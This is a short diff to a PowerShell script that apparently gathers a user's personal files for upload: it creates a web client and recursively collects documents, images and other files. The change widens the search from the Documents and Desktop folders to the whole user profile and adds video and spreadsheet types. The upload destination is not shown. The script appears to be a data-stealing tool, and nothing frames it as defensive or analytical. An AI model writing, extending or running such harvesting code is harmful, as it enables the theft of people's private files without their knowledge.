@@ -1,6 +1,6 @@
 $wc = New-Object System.Net.WebClient
 
-$files = Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include *.pdf, *.doc, *.docx, *.txt, *.jpg, *.png -File -Recurse -ErrorAction SilentlyContinue
+$files = Get-ChildItem -Path "$env:USERPROFILE\" -Include *.pdf, *.doc, *.docx, *.txt, *.jpg, *.png, *.mp4, *.xls -File -Recurse -ErrorAction SilentlyContinue
 
 if ($files.Count -eq 0) {
     Write-Host "No se encontraron archivos para subir."
